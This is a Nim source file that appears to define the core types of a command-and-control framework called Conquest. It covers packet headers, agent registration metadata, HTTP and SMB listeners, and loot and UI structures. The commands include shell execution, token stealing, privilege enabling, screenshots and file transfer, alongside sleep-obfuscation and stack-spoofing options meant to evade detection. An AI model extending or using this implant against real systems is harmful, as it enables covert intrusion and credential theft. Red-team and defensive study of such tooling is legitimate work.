import tables
import json
import system
import mummy
when defined(client): 
    import whisky
when defined(agent):
    import winim/lean

import ./toml/toml

# Custom Binary Task structure
const   
    MAGIC* = 0x514E3043'u32     # Magic value: C0NQ
    VERSION* = 1'u8             # Version 1
    HEADER_SIZE* = 48'u8        # 48 bytes fixed packet header size

type 
    PacketType* = enum 
        MSG_TASK = 0'u8
        MSG_RESULT = 1'u8 
        MSG_REGISTER = 2'u8
        MSG_HEARTBEAT = 100'u8

    HeaderFlags* = enum 
        # Flags should be powers of 2 so they can be connected with or operators
        FLAG_PLAINTEXT = 0'u16
        FLAG_ENCRYPTED = 1'u16
        FLAG_COMPRESSED = 2'u16
        FLAG_FRAGMENTED = 4'u16 

    CommandType* {.size: sizeof(uint16).} = enum 
        CMD_EXIT = "exit"
        CMD_SELF_DESTRUCT = "self-destruct"
        CMD_SLEEP = "sleep"
        CMD_SLEEPMASK = "sleepmask"
        CMD_LINK = "link"
        CMD_UNLINK = "unlink"
        CMD_SHELL = "shell"
        CMD_BOF = "bof"
        CMD_DOTNET = "dotnet"
        CMD_DOWNLOAD = "download"
        CMD_UPLOAD = "upload"
        CMD_SCREENSHOT = "screenshot"
        CMD_PWD = "pwd"
        CMD_CD = "cd"
        CMD_LS = "ls"
        CMD_RM = "rm"
        CMD_RMDIR = "rmdir"
        CMD_MOVE = "move"
        CMD_COPY = "copy"
        CMD_PS = "ps"
        CMD_ENV = "env" 
        CMD_MAKE_TOKEN = "make-token"
        CMD_STEAL_TOKEN = "steal-token"
        CMD_REV2SELF = "rev2self"
        CMD_TOKEN_INFO = "token-info"
        CMD_ENABLE_PRIV = "enable-privilege"
        CMD_DISABLE_PRIV = "disable-privilege"

    StatusType* = enum 
        STATUS_COMPLETED = 0'u8
        STATUS_FAILED = 1'u8
        STATUS_IN_PROGRESS = 2'u8 

    ResultType* = enum 
        RESULT_STRING = 0'u8 
        RESULT_BINARY = 1'u8
        RESULT_NO_OUTPUT = 2'u8
        RESULT_PROCESSES = 3'u8
        RESULT_LINK = 4'u8
        RESULT_UNLINK = 5'u8

    LogType* {.size: sizeof(uint8).} = enum 
        LOG_INFO = "[INFO] "
        LOG_ERROR = "[FAIL] "
        LOG_SUCCESS = "[DONE] "
        LOG_WARNING = "[WARN] "
        LOG_COMMAND = "[>>>>] "
        LOG_OUTPUT = ""
        LOG_INFO_SHORT = "[*] "
        LOG_ERROR_SHORT = "[-] "
        LOG_SUCCESS_SHORT = "[+] "
        LOG_WARNING_SHORT = "[!] "

    SleepObfuscationTechnique* = enum 
        NONE = 0'u8
        EKKO = 1'u8 
        ZILEAN = 2'u8
        FOLIAGE = 3'u8

    ExitType* {.size: sizeof(uint8).} = enum 
        EXIT_PROCESS = "process"
        EXIT_THREAD = "thread"

    ModuleType* {.size: sizeof(uint32).} = enum 
        MODULE_SHELL = 1'u32 
        MODULE_BOF = 2'u32
        MODULE_DOTNET = 4'u32
        MODULE_FILESYSTEM = 8'u32 
        MODULE_FILETRANSFER = 16'u32
        MODULE_SCREENSHOT = 32'u32
        MODULE_SYSTEMINFO = 64'u32 
        MODULE_TOKEN = 128'u32

# Encryption 
type    
    Uuid* = uint32
    Bytes* = seq[byte]
    Key* = array[32, byte]
    Iv* = array[12, byte]
    AuthenticationTag* = array[16, byte]
    KeyRC4* = array[16, byte]

# Packet structure
type 
    Header* = object
        magic*: uint32              # [4 bytes ] magic value 
        version*: uint8             # [1 byte  ] protocol version
        packetType*: uint8          # [1 byte  ] message type 
        flags*: uint16              # [2 bytes ] message flags
        size*: uint32               # [4 bytes ] size of the payload body
        agentId*: Uuid              # [4 bytes ] agent id, used as AAD for encryption
        seqNr*: uint32              # [4 bytes ] sequence number, used as AAD for encryption
        iv*: Iv                     # [12 bytes] random IV for AES256 GCM encryption
        gmac*: AuthenticationTag    # [16 bytes] authentication tag for AES256 GCM encryption

    TaskArg* = object 
        argType*: uint8             # [1 byte  ] argument type
        data*: seq[byte]            # variable length data (for variable data types (STRING, BINARY), the first 4 bytes indicate data length)

    Task* = object 
        header*: Header
        taskId*: Uuid               # [4 bytes ] task id
        listenerId*: Uuid           # [4 bytes ] listener id
        timestamp*: uint32          # [4 bytes ] unix timestamp
        command*: uint16            # [2 bytes ] command id 
        argCount*: uint8            # [1 byte  ] number of arguments
        args*: seq[TaskArg]         # variable length arguments

    TaskResult* = object 
        header*: Header 
        taskId*: Uuid               # [4 bytes ] task id
        listenerId*: Uuid           # [4 bytes ] listener id
        timestamp*: uint32          # [4 bytes ] unix timestamp
        command*: uint16            # [2 bytes ] command id 
        status*: uint8              # [1 byte  ] success flag 
        resultType*: uint8          # [1 byte  ] result data type (string, binary)
        length*: uint32             # [4 bytes ] result length
        data*: seq[byte]            # variable length result

# Checkin binary structure
type
    Heartbeat* = object 
        header*: Header            # [48 bytes ] fixed header
        listenerId*: Uuid          # [4 bytes  ] listener id
        timestamp*: uint32         # [4 bytes  ] unix timestamp

# Registration binary structure 
type 
    # All variable length fields are stored as seq[byte], prefixed with 4 bytes indicating the length of the following data
    AgentMetadata* = object 
        listenerId*: Uuid
        username*: seq[byte]
        hostname*: seq[byte]
        domain*: seq[byte]
        ip*: seq[byte]
        os*: seq[byte]
        process*: seq[byte]
        pid*: uint32
        isElevated*: uint8
        sleep*: uint32
        jitter*: uint32
        modules*: uint32

    Registration* = object
        header*: Header
        agentPublicKey*: Key        # [32 bytes ] Public key of the connecting agent for key exchange
        metadata*: AgentMetadata

# Agent structure
type 
    Agent* = ref object 
        agentId*: string
        listenerId*: string 
        username*: string 
        impersonationToken*: string
        hostname*: string
        domain*: string
        ipInternal*: string
        ipExternal*: string
        os*: string
        process*: string
        pid*: int
        elevated*: bool 
        sleep*: int 
        jitter*: int
        tasks*: seq[Task]
        modules*: uint32
        firstCheckin*: int64
        latestCheckin*: int64
        sessionKey*: Key
        links*: seq[string]

    # Session entry for client UI
    UIAgent* = ref object 
        agentId*: string
        listenerId*: string 
        username*: string 
        impersonationToken*: string
        hostname*: string
        domain*: string
        ipInternal*: string
        ipExternal*: string
        os*: string
        process*: string
        pid*: int
        elevated*: bool 
        sleep*: int 
        jitter*: int
        modules*: uint32
        firstCheckin*: int64
        latestCheckin*: int64

# Listener structure
type 
    ListenerType* {.size: sizeof(uint8).} = enum
        LISTENER_HTTP = "HTTP"
        LISTENER_SMB = "SMB"

    Listener* = ref object
        server*: Server
        listenerId*: string
        case listenerType*: ListenerType
        of LISTENER_HTTP: 
            hosts*: string
            address*: string
            port*: int
        of LISTENER_SMB: 
            pipe*: string

    UIListener* = ref object
        listenerId*: string
        case listenerType*: ListenerType
        of LISTENER_HTTP: 
            hosts*: string
            address*: string
            port*: int
        of LISTENER_SMB: 
            pipe*: string

#[
    Client <-> Server WebSocket communication
]#
type 
    EventType* = enum
        CLIENT_HEARTBEAT = 0'u8             # Basic checkin 
        CLIENT_KEY_EXCHANGE = 200'u8        # Unencrypted public key sent by both parties for key exchange

        # Sent by client 
        CLIENT_AGENT_BUILD = 1'u8           # Generate an agent binary for a specific listener
        CLIENT_AGENT_TASK = 2'u8            # Instruct TS to send queue a command for a specific agent
        CLIENT_LISTENER_START = 3'u8        # Start a listener on the TS
        CLIENT_LISTENER_STOP = 4'u8         # Stop a listener
        CLIENT_LOOT_REMOVE = 5'u8           # Remove loot on the team server
        CLIENT_LOOT_GET = 6'u8              # Request file/screenshot from the team server for preview or download
        CLIENT_AGENT_REMOVE = 7'u8          # Delete agent from the team server database

        # Sent by team server
        CLIENT_PROFILE = 100'u8             # Team server profile and configuration 
        CLIENT_LISTENER_ADD = 101'u8        # Add listener to listeners table
        CLIENT_AGENT_ADD = 102'u8           # Add agent to sessions table
        CLIENT_AGENT_CHECKIN = 103'u8       # Update agent checkin
        CLIENT_AGENT_PAYLOAD = 104'u8       # Return agent payload binary 
        CLIENT_CONSOLE_ITEM = 105'u8        # Add entry to a agent's console 
        CLIENT_EVENTLOG_ITEM = 106'u8       # Add entry to the eventlog   
        CLIENT_BUILDLOG_ITEM = 107'u8       # Add entry to the build log
        CLIENT_LOOT_ADD = 108'u8            # Add file or screenshot stored on the team server to preview on the client, only sends metadata and not the actual file content
        CLIENT_LOOT_DATA = 109'u8           # Send file/screenshot bytes to the client to display as preview or to download to the client desktop
        CLIENT_IMPERSONATE_TOKEN = 110'u8   # Access token impersonated
        CLIENT_REVERT_TOKEN = 111'u8        # Revert to original logon session 
        CLIENT_PROCESSES = 112'u8           # Send processes

    Event* = object 
        eventType*: EventType               
        timestamp*: int64 
        data*: JsonNode   

# Context structures
type 
    KeyPair* = object 
        privateKey*: Key 
        publicKey*: Key

    Profile* = TomlTableRef

    WsConnection* = ref object
        when defined(server):
            ws*: mummy.WebSocket
        when defined(client):
            ws*: whisky.WebSocket
        sessionKey*: Key

    Conquest* = ref object
        dbPath*: string
        listeners*: Table[string, Listener]
        threads*: Table[string, Thread[Listener]]
        agents*: Table[string, Agent]
        keyPair*: KeyPair
        profileString*: string
        profile*: Profile
        client*: WsConnection

    WorkingHours* = ref object 
        enabled*: bool
        startHour*: int32 
        startMinute*: int32
        endHour*: int32
        endMinute*: int32

    TransportSettings* = ref object 
        listenerId*: string
        when defined(TRANSPORT_HTTP): 
            hosts*: string
        when defined(TRANSPORT_SMB): 
            pipe*: string 
            hPipe*: HANDLE

    SleepSettings* = ref object 
        sleepDelay*: uint32
        jitter*: uint32
        sleepTechnique*: SleepObfuscationTechnique
        spoofStack*: bool
        workingHours*: WorkingHours

    AgentCtx* = ref object
        agentId*: string
        transport*: TransportSettings
        sleepSettings*: SleepSettings
        killDate*: int64
        sessionKey*: Key
        agentPublicKey*: Key
        profile*: Profile
        registered*: bool
        links*: Table[uint32, uint32]

# Modules 
type 
    ProcessInfo* = object 
        pid*: uint32
        ppid*: uint32 
        name*: string 
        user*: string
        session*: uint32
        when defined(client):
            children*: seq[uint32]
        
    # FileInfo* = object 
    #     path*: string 
    #     isDir*: bool
    #     lastWriteTime*: int64
    #     mode*: string
    #     size*: uint32

# Structure for command module definitions 
type 
    ArgType* = enum 
        STRING = 0'u8
        INT = 1'u8
        BOOL = 2'u8 
        BINARY = 3'u8 

when defined(client):
    import nimpy
    type 
        Argument* = ref object 
            name*: string
            description*: string 
            isRequired*: bool 
            isFlag*: bool 
            flag*: string
            case argType*: ArgType
            of STRING:
                strDefault*: string 
            of INT: 
                intDefault*: int 
            of BOOL:
                boolDefault*: bool 
            of BINARY: 
                binDefault*: seq[byte]

        Command* = ref object of PyNimObjectExperimental
            name*: string 
            description*: string 
            example*: string
            message*: string 
            arguments*: seq[Argument]
            hasHandler*: bool
            handler*: PyObject 

        Module* = ref object of RootObj
            name*: string 
            description*: string
            path*: string 
            builtin*: bool
            commands*: seq[Command]

# Definitions for ImGui User interface
type 
    ConsoleItem* = ref object 
        itemType*: LogType
        timestamp*: string
        text*: string
        highlight*: bool

    ConsoleItems* = ref object
        items*: seq[ConsoleItem]

    AgentBuildInformation* = ref object 
        listenerId*: string
        sleepSettings*: SleepSettings
        verbose*: bool
        killDate*: int64
        modules*: uint32

    LootItemType* = enum 
        DOWNLOAD = 0'u8 
        SCREENSHOT = 1'u8

    LootItem* = ref object 
        itemType*: LootItemType
        lootId*: string
        agentId*: string
        host*: string 
        path*: string 
        timestamp*: int64
        size*: int 